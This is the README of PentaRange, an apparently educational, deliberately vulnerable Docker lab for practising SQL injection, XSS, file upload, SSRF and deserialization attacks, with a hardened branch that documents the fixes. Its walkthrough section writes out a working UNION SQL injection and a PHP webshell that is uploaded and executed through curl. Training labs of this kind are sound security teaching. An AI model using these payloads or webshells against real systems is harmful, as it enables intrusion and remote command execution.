# 🎯 PentaRange

> 一个专为网络安全爱好者和渗透测试初学者打造的综合性漏洞靶场。无需复杂配置，一键启动，安全地体验和学习各种漏洞的利用与防御。

[![CI](https://github.com/zhuz3732-dev/PentaRange/actions/workflows/ci.yml/badge.svg)](https://github.com/zhuz3732-dev/PentaRange/actions/workflows/ci.yml)
![License](https://img.shields.io/badge/license-MIT-blue)
![Docker](https://img.shields.io/badge/docker-compose-2496ED)

---

## ⚠️ 免责声明

**本项目包含故意设计的严重安全漏洞，仅限在隔离的本地环境中用于网络安全教育和研究。**

**严禁将本项目部署到任何公网服务器或生产环境。** 所有端口默认只绑定 `127.0.0.1`；如果你改成了 `0.0.0.0`，那就等于把一个可被直接 RCE 的靶子挂上了互联网。因违规部署在公网导致被入侵、数据泄露等一切后果，由部署者自行承担。作者对此不承担任何法律责任。

---

## ✨ 特性

- **覆盖全面**：SQL 注入、XSS、文件上传、SSRF、反序列化五大类，对应 OWASP Top 10 常见面。
- **难度分级**：每一关分 `low` / `medium` / `high` 三档，low 是教科书式漏洞，high 是需要绕过防护的真问题。
- **真实可打通**：文件上传关配了 Apache + mod_php 容器挂载同一个 uploads 卷 —— webshell 是真的会执行，不是"文件落盘就算赢"。
- **环境隔离**：四个容器跑在独立 bridge 网络里，不污染宿主机。
- **源码随关可见**：每关页面直接展示该关源码，`/source` 还能浏览全部模块。看懂才能打通。
- **通关有据**：每档一个 flag，存在数据库 `flags` 表，拿到即通关。

---

## 🐳 快速开始

**环境要求：** Docker 20.10+ 且带 `docker compose`（v2 插件版）。

```bash
# 1. 克隆项目
git clone https://github.com/zhuz3732-dev/PentaRange.git
cd PentaRange

# 2. 一键启动
docker compose up -d --build

# 3. 验证三个入口
make verify
```

启动后访问：

| 服务 | 地址 | 说明 |
|---|---|---|
| 靶场门户 | http://127.0.0.1:8000 | 关卡列表，从这里开始 |
| uploads docroot | http://127.0.0.1:8081 | Apache + mod_php，上传文件在这里执行 |
| Adminer | http://127.0.0.1:8082 | 数据库控制台，服务器 `db`，账号 `root` / `PentaRange_admin_2026` |

首次启动需要等 MySQL 初始化（约 20–40 秒），`web` 容器会自动重试连接直到数据库就绪。

---

## 🗺️ 关卡地图

| 关卡 | Low | Medium | High |
|---|---|---|---|
| **SQL 注入** | UNION 注入，报错回显 | 布尔盲注，只有真假两种回显 | 关键字黑名单，需注释+大小写绕过 |
| **XSS** | 反射型，零编码 | 存储型，偷 admin cookie | 服务端转义了，但前端 innerHTML 是 sink |
| **文件上传** | 扩展名完全不查 | 只查 Content-Type | 黑名单绕过 + `.htaccess` 覆写 |
| **SSRF** | 无任何校验 | 只限 scheme，link-local 可达 | hostname 白名单，十进制 IP 绕过 |
| **反序列化** | `pickle.loads` 直接 RCE | `yaml.load` 默认 Loader | 对象属性注入到文件读 sink |

每个 `low` 档页面都写了提示和入口参数；`high` 档只给方向，具体 payload 自己构造。

---

## 🧪 快速体验一关

以 SQL 注入 low 档为例：

```bash
# 页面：http://127.0.0.1:8000/challenge/sqli/low
# 正常请求
curl -s 'http://127.0.0.1:8000/challenge/sqli/low?q=1'

# 注入：把 users.secret 里的 flag 拉出来
# 原始 SQL 是  SELECT id, username, email FROM users WHERE id = <q>
# 所以用 UNION 补齐列数，把 flag 塞进 email 字段回显
curl -s --get 'http://127.0.0.1:8000/challenge/sqli/low' \
  --data-urlencode "q=-1 UNION SELECT 1,2,secret FROM users WHERE username='admin'"
```

文件上传 low 档：

```bash
# 造一个 PHP webshell，直接上传（扩展名不查）
printf '<?php echo shell_exec($_GET["c"]); ?>' > sh.php
curl -s -F 'file=@sh.php' 'http://127.0.0.1:8000/challenge/upload/low'

# 然后去 Apache 那侧执行它 —— 这才是这个漏洞真正的杀伤力
curl -s 'http://127.0.0.1:8081/sh.php?c=id'
```

---

## 📁 目录结构

```
PentaRange/
├── docker-compose.yml        # 四个服务的编排，端口全部绑 127.0.0.1
├── Makefile                  # up / down / reset / seed / verify / lint
├── app/                      # Flask 靶场门户
│   ├── main.py               # 入口，关卡路由与调度
│   ├── config.py             # 配置（故意弱默认值）
│   ├── db.py                 # raw_cursor（不安全）与 safe_cursor（参数化）并存
│   ├── seed.sql              # 种子数据 + flags 表
│   ├── challenges/           # 五类漏洞，每类三个难度
│   │   ├── sqli.py
│   │   ├── xss.py
│   │   ├── upload.py
│   │   ├── ssrf.py
│   │   └── deserialize.py
│   ├── templates/            # Jinja2 模板
│   └── static/style.css
├── webshell/                 # Apache + mod_php，挂载 uploads 卷
│   ├── Dockerfile
│   ├── htaccess              # 随镜像下发的 .htaccess
│   └── index.php             # uploads 目录列表页
└── .github/workflows/ci.yml  # 语法检查 + compose 配置校验 + 镜像构建
```

---

## 🔧 常用命令

```bash
make up        # 构建并启动
make ps        # 查看状态
make logs      # 跟踪日志
make verify    # 冒烟测试三个入口
make shell-web # 进 web 容器
make shell-db  # 进 mysql 客户端
make seed      # 重灌种子数据
make reset     # 清空容器和卷，回到全新状态
make lint      # Python 语法检查
```

---

## 🛡️ 修复路线（`hardened` 分支）

靶场的另一半价值是学会怎么修。**修复版放在 `hardened` 分支**，与 `main` 的 diff 就是一份现成的加固清单：

- `db.py` 的 `raw_cursor()` 全部换掉 `safe_cursor()` 参数化查询
- `upload.py` 改白名单 + 重命名 + 强制 `Content-Disposition: attachment`，并关掉 `AllowOverride`
- `ssrf.py` 改「解析后校验 IP」而不是「校验 URL 字符串」，拒绝全部私有/环回/link-local 段
- `deserialize.py` 换 `yaml.safe_load`，彻底移除 `pickle` 入口
- `xss.py` 前端 sink 从 `innerHTML` 换 `textContent`，并对输出统一转义
- `main.py` 关掉 `SOURCE_DISCLOSURE`，`SECRET_KEY` 改为启动时随机生成
- `seed.sql` 里的明文口令与 flag 改为哈希 + 环境变量注入

切过去看差异：

```bash
git fetch origin
git diff main..origin/hardened
```

---

## 🧰 工具链

项目用现成开源工具做质量门禁，不重复造轮子：

| 用途 | 工具 |
|---|---|
| Workflow 语义检查 | [actionlint](https://github.com/rhysd/actionlint) |
| 密钥泄露扫描 | [gitleaks](https://github.com/gitleaks/gitleaks) |
| 本地提交前检查（与 CI 同一套 hook） | [pre-commit](https://pre-commit.com) + [ruff](https://github.com/astral-sh/ruff) |
| 依赖更新 | [Renovate](https://docs.renovatebot.com) + [Dependabot](https://docs.github.com/code-security/dependabot) |

一次跑全部检查：

```bash
pip install pre-commit
pre-commit install
pre-commit run --all-files
```

`.gitleaks.toml` 里放行的是**故意留在 lab 里的假凭据**（`seed.sql` 的明文口令、文档里的占位 Token）—— 那是教学材料。真实凭据照抓不误。

---

## 🤝 参与贡献

见 [CONTRIBUTING.md](CONTRIBUTING.md)。新增一关只需要动两处：写 `app/challenges/<level>.py`（实现 `low`/`medium`/`high` 三个函数），然后在 `app/main.py` 的 `LEVEL_INFO` 里加上关卡说明。`challenges/__init__.py` 会自动注册。

---

## 📜 许可

MIT，见 [LICENSE](LICENSE)。